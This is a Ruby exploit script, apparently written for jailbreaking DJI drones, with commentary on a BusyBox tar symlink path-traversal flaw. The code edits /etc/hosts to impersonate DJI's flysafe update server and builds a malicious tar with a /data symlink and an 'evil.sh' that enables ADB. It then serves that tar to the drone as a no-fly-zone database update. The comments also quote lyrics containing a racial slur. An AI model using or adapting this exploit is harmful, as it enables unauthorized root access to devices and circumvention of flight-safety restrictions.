# Independence Day - http://www.imdb.com/title/tt0116629/
# https://www.youtube.com/watch?v=bhGfpwfae-k
#
# Thx to DarkSimpson for the reminder on something I considered banging out last month... 
# https://twitter.com/thedjiproblem/status/881290409149943810 
#
# This technique requires 50% battery or more present! 
#
# "They say if you watch somethin' long enough, you'll become it.
#  You know, they say imitation is the best form of flattery
#  That's what I was told
#  A lot of niggas is imitatin' this real gangsta shit
#  You ain't cut from it
#  You dig?" - https://genius.com/Snoop-dogg-neva-left-lyrics
#
# To be clear 99% of the people saying "we" in this scene have NOTHING to do with the real work being done. 
# These Darwin Awards waiting to happen are NOT doing anything but parroting info others leak to them
# https://www.facebook.com/groups/DjiJailbreak/  <---- NO Affiliation! 
# 
# Lets examine POV's claims and red herrings. I've been chasing them for over a month or so... They make complete sense now. 
# https://www.rcgroups.com/forums/showpost.php?p=36232471&postcount=15113
# "BusyBox FTPD is running on all interfaces, but unlike Phantom 3, in Mavic it's restricted to '/ftp' directory." 
# "Luckily, there are underground 0day exploits for FTPD for path traversal." 
# "I can confirm that you can traverse out of the '/ftp' directory and reach the init scripts to set debug flag.  
#
# This *technically* became "0day" when BusyBox decided to NOT patch the reported issue, and opted to leave a TODO instead
# https://git.busybox.net/busybox/commit/?id=a116552869db5e7793ae10968eb3c962c69b3d8c
# "tar: add a note about -C and symlink-in-tarball attack Signed-off-by: Denys Vlasenko <vda.linux@googlemail.com>"
#
# https://github.com/mozilla-b2g/busybox/blob/master/archival/tar.c#L26
# "TODO: security with -C DESTDIR option can be enhanced."
# 
# *Some* vendors have patched the issue. It seems to be a mixed bag as to what you find in the wild. 
# "Bug 8411 - tar: directory traversal via crafted tar file which contains a symlink pointing outside of the current directory"
# https://bugs.busybox.net/attachment.cgi?id=6211&action=diff
# 
# During NFZ Update a tar file is dropped via FTP after being downloaded via https, after an http JSON redirection.
#
# Kick off Assistant with --test_server
# /Applications/Assistant_1_1_0.app/Contents/MacOS/Assistant --test_server
#
# Updating No-fly Zone Database is required. Update now?
# (click Confirm) 
#
# 16:34:02.279749 IP (tos 0x2,ECT(0), ttl 64, id 48032, offset 0, flags [DF], proto TCP (6), length 82)
#    192.168.42.3.60478 > 192.168.42.2.ftp: Flags [P.], cksum 0x384d (correct), seq 40:70, ack 141, win 4113, options [nop,nop,TS val 509914967 ecr 1336239], length 30: FTP, length: 30
#    STOR //upgrade/data_copy.bin
#    0x0000:  4502 0052 bba0 4000 4006 a9ad c0a8 2a03  E..R..@.@.....*.
#    0x0010:  c0a8 2a02 ec3e 0015 7ad4 e07c 7e46 bd03  ..*..>..z..|~F..
#    0x0020:  8018 1011 384d 0000 0101 080a 1e64 af57  ....8M.......d.W
#    0x0030:  0014 63af 5354 4f52 202f 2f75 7067 7261  ..c.STOR.//upgra
#    0x0040:  6465 2f64 6174 615f 636f 7079 2e62 696e  de/data_copy.bin
#    0x0050:  0d0a     
#
# "I can't confirm it personally, but it was reported a couple of times on mavicpilots. It seems that it was patched with firmware .200 or .300" 
# https://www.reddit.com/r/djimavic/comments/69xqdv/rooting_the_mavic/dhioetc/
# 
# Sorry... DotDotPwn is NOT going to work, EVER.
# "Tried to find out something about the "FTP-path traversal" with the "DotDotPwn"-tool in Kali linux." 
# https://forums.hak5.org/index.php?/topic/39735-reversing-mavic-pro-firmware/&do=findComment&comment=286172
#
# The "patch" that DJI chose to go with instead of the vendor issues patch is to make /system "ro" on the Mavic. (Other firmware such as *current* Spark may be "rw" depending on version) 
# /dev/block/platform/comip-mmc.1/by-name/system /system ext4 ro,relatime,data=ordered 0 0

require 'webrick'

# Check if Running as root, add hosts file entry for '127.0.0.1 flysafe.aasky.net'
if ENV['USER'] == "root"
  print "Running as root... thanks!\n" 
else
  print "Run as root please\n"
  exit
end
if File.readlines("/etc/hosts").grep(/flysafe\.aasky\.net/).size > 0
  print "Flysafe redirection already in hosts file\n"
else
  print "Adding entry for Flysafe redirection to /etc/hosts"
  File.open("/etc/hosts", 'a') {|f| f.write("\n127.0.0.1 flysafe.aasky.net\n") }
end


server = WEBrick::HTTPServer.new(:Port => 80,
                             :SSLEnable => false,
                             :ServerAlias => 'localhost')

server.mount_proc '/api' do |req, res|
  res.body = '{"status":0,"version":"01.00.00.03","url":"http://localhost/flysafe_db_files/GetRoot","update":false}'
end

server.mount_proc '/flysafe_db_files' do |req, res|
  res.body = File.read("bug.tar")
end

trap 'INT' do server.shutdown end

# This is not working... fix it... 
# Debug with:
# while true; do adb pull /ftp/upgrade/data_copy.bin data_copy.bin; done

system("rm bug.tar")
system("rm -rf symlink")
system("echo 'get root' > anything.txt")
system("tar cvf bug.tar anything.txt")
system("ln -s /data symlink")
system("tar --append -f bug.tar symlink")
system("rm -rf symlink")
system("mkdir -p symlink")

adbensh = 
"#!/system/bin/sh\n/system/bin/adb_en.sh\n"
File.open("symlink/evil.sh", 'w') {|f| f.write(adbensh) }
%[tar --append -f bug.tar symlink/evil.sh]

pid = spawn("/Applications/Assistant_1_1_0.app/Contents/MacOS/Assistant --test_server --factory")
Process.detach(pid)

server.start

